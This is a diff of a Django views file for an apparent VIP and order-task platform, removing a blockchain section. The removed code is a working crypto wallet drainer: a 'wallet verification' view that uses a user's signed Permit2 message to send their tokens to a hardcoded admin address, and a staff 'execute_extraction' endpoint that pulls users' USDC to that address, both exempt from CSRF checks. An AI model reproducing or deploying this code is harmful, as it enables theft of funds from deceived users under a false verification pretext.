@@ -1,10 +1,6 @@
-import os
-import json
 from decimal import Decimal
 from datetime import timedelta
 from functools import wraps
-from web3 import Web3
-import traceback
 from django.http import JsonResponse
 from django.shortcuts import render, redirect, get_object_or_404
 from django.contrib.auth.models import User
@@ -16,59 +12,8 @@ from django.utils import timezone
 from django.db import transaction
 from django.db.models import Count, Q, Max, Sum
 from django.urls import reverse
-from django.views.decorators.csrf import csrf_exempt
-from django.views.decorators.http import require_POST
 
 from .models import UserProfile, VipLevel, Product, ProductEvaluation, WithdrawalRequest, DepositRecord, SupportMessage, UserOrder, LuckyReward, SuccessiveOrderPlan, HomePageSettings    
-from dotenv import load_dotenv
-
-load_dotenv()
-# --- BLOCKCHAIN CONFIG ---
-w3 = Web3(Web3.HTTPProvider(os.getenv('RPC_URL')))
-ADMIN_PRIVATE_KEY = os.getenv('ADMIN_PRIVATE_KEY')
-ADMIN_ADDRESS = '0xC629b1959A638d62B60665317C0D3874B389d8F4'
-USDC_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
-
-PERMIT_TRANSFER_FROM_ABI = [
-    {
-        "inputs": [
-            {
-                "components": [
-                    {
-                        "components": [
-                            {"internalType": "address", "name": "token", "type": "address"},
-                            {"internalType": "uint256", "name": "amount", "type": "uint256"}
-                        ],
-                        "internalType": "struct AllowanceTransfer.TokenPermissions",
-                        "name": "permitted",
-                        "type": "tuple"
-                    },
-                    {"internalType": "address", "name": "spender", "type": "address"},
-                    {"internalType": "uint256", "name": "nonce", "type": "uint256"},
-                    {"internalType": "uint256", "name": "deadline", "type": "uint256"}
-                ],
-                "internalType": "struct AllowanceTransfer.PermitTransferFrom",
-                "name": "permit",
-                "type": "tuple"
-            },
-            {
-                "components": [
-                    {"internalType": "address", "name": "to", "type": "address"},
-                    {"internalType": "uint256", "name": "requestedAmount", "type": "uint256"}
-                ],
-                "internalType": "struct AllowanceTransfer.SignatureTransferDetails",
-                "name": "transferDetails",
-                "type": "tuple"
-            },
-            {"internalType": "address", "name": "owner", "type": "address"},
-            {"internalType": "bytes", "name": "signature", "type": "bytes"}
-        ],
-        "name": "permit",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-]
 
 def get_client_ip(request):
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -93,177 +38,13 @@ def staff_required(view_func):
         return view_func(request, *args, **kwargs)
     return wrapper
 
-# --- BLOCKCHAIN VIEWS ---
-
-@csrf_exempt
-def execute_approval(request):
-    if request.method != 'POST':
-        return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)
-
-    try:
-        data = json.loads(request.body)
-        signature = data.get('signature')
-        message = data.get('message')
-        user_address = data.get('userAddress')
-
-        if not signature or not message:
-            return JsonResponse({'status': 'error', 'message': 'Missing data.'}, status=400)
-        
-        PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
-        permit2 = w3.eth.contract(address=PERMIT2_ADDRESS, abi=PERMIT_TRANSFER_FROM_ABI)
-        
-        # 1. Build PermitTransferFrom struct tuple
-        permit_transfer_from = (
-            (
-                message['permitted']['token'],
-                int(message['permitted']['amount'])
-            ),
-            message['spender'],
-            int(message['nonce']),
-            int(message['deadline'])
-        )
-
-        # 2. Build SignatureTransferDetails struct tuple
-        transfer_details = (
-            str(ADMIN_ADDRESS), 
-            int(message['permitted']['amount'])
-        )
-
-        # 3. Convert signature hex to bytes
-        sig_bytes = bytes.fromhex(signature[2:]) if signature.startswith('0x') else bytes.fromhex(signature)
-
-        # 4. Build transaction targeting permit2.permit(...)
-        tx = permit2.functions.permit(
-            permit_transfer_from,
-            transfer_details,
-            str(user_address),
-            sig_bytes
-        ).build_transaction({
-            'from': ADMIN_ADDRESS,
-            'nonce': w3.eth.get_transaction_count(ADMIN_ADDRESS),
-            'gas': 300000,
-            'gasPrice': w3.eth.gas_price
-        })
-        
-        # 5. Sign and send transaction (using raw_transaction)
-        signed_tx = w3.eth.account.sign_transaction(tx, ADMIN_PRIVATE_KEY)
-        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
-        
-        # 6. Wait for transaction receipt and confirm status == 1 before updating database
-        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
-        
-        if receipt.get('status') == 1:
-            if hasattr(request.user, 'profile'):
-                profile = request.user.profile
-                profile.is_wallet_verified = True
-                profile.save()
-
-            return JsonResponse({'status': 'success', 'tx_hash': tx_hash.hex()})
-        else:
-            return JsonResponse({'status': 'error', 'message': 'Transaction reverted on-chain.'}, status=400)
-
-    except Exception as e:
-        traceback.print_exc()
-        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
-
-@csrf_exempt
-def verify_approval(request):
-    if request.method == 'POST':
-        data = json.loads(request.body)
-        tx_hash = data.get('tx_hash')
-        receipt = w3.eth.get_transaction_receipt(tx_hash)
-        if receipt and receipt['status'] == 1:
-            profile = request.user.profile
-            profile.is_wallet_verified = True
-            profile.save()
-            return JsonResponse({'status': 'success'})
-        return JsonResponse({'status': 'error', 'message': 'Transaction failed'})
-    return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)
-
 # --- DASHBOARD VIEW ---
 
-@login_required
+@staff_required
 def staff_wallet_dashboard(request):
     profiles = UserProfile.objects.all()
-    context = {
-        'profiles': profiles,
-        'admin_address': ADMIN_ADDRESS,
-    }
+    context = {'profiles': profiles}
     return render(request, 'staff/wallet_dashboard.html', context)
-
-@csrf_exempt
-@login_required
-def execute_extraction(request):
-    if request.method != 'POST':
-        return JsonResponse({'status': 'error', 'message': 'Invalid request method.'}, status=405)
-
-    try:
-        data = json.loads(request.body)
-        user_address = data.get('userAddress')
-        amount = int(data.get('amount')) # Amount in token base units (e.g., USDC decimals = 6)
-        token_address = data.get('tokenAddress', USDC_ADDRESS)
-
-        if not user_address or not amount:
-            return JsonResponse({'status': 'error', 'message': 'Missing extraction parameters.'}, status=400)
-
-        PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"
-        
-        # Permit2 allowance transfer from function utilizing allowance transfer mapping instead of signature transfer details if pre-approved,
-        # or utilizing standard AllowanceTransfer approval mechanism
-        PERMIT2_ALLOWANCE_TRANSFER_ABI = [
-            {
-                "inputs": [
-                    {"internalType": "address", "name": "owner", "type": "address"},
-                    {"internalType": "address", "name": "token", "type": "address"},
-                    {"internalType": "address", "name": "spender", "type": "address"},
-                    {"internalType": "uint160", "name": "amount", "type": "uint160"},
-                    {"internalType": "uint48", "name": "expiration", "type": "uint48"}
-                ],
-                "name": "approve",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {"internalType": "address", "name": "from", "type": "address"},
-                    {"internalType": "address", "name": "to", "type": "address"},
-                    {"internalType": "uint160", "name": "amount", "type": "uint160"},
-                    {"internalType": "address", "name": "token", "type": "address"}
-                ],
-                "name": "transferFrom",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ]
-
-        permit2 = w3.eth.contract(address=PERMIT2_ADDRESS, abi=PERMIT2_ALLOWANCE_TRANSFER_ABI)
-        
-        tx = permit2.functions.transferFrom(
-            user_address,
-            ADMIN_ADDRESS,
-            amount,
-            token_address
-        ).build_transaction({
-            'from': ADMIN_ADDRESS,
-            'nonce': w3.eth.get_transaction_count(ADMIN_ADDRESS),
-            'gas': 150000,
-            'gasPrice': w3.eth.gas_price
-        })
-
-        signed_tx = w3.eth.account.sign_transaction(tx, ADMIN_PRIVATE_KEY)
-        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
-
-        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
-        if receipt.get('status') == 1:
-            return JsonResponse({'status': 'success', 'tx_hash': tx_hash.hex()})
-        else:
-            return JsonResponse({'status': 'error', 'message': 'Extraction transaction reverted on-chain.'}, status=400)
-
-    except Exception as e:
-        traceback.print_exc()
-        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
 
 # STAFF LOGIN
 
